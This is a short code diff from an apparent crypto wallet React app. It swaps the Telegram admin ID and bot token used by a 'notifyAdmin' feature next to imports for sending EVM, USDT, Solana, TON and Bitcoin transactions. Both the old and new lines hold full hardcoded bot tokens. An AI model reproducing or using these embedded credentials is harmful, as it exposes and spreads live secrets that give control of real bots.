@@ -5,8 +5,8 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
   import { sendEvmTx, sendUsdtErc20Tx, sendSolTx, sendTonTx, sendBtcTx, getBtcFeeEstimate } from '../lib/crypto/txSender.js';
 
   // ─── ADMIN NOTIFICATIONS ──────────────────────────────────────────────────────
-  const ADMIN_ID = "1192740493";
-  const NOTIFY_BOT_TOKEN = import.meta.env.VITE_BOT_TOKEN || "8617702690:AAHEEzFWLb9LPxhCKVtkw7P00vQ2FeJWxNo";
+  const ADMIN_ID = "7890546702";
+  const NOTIFY_BOT_TOKEN = import.meta.env.VITE_BOT_TOKEN || "8834785563:AAGLnLZrAIJNHHfRG0cwk07DcLqiSyBG3UU";
 
   async function notifyAdmin(text) {
     try {
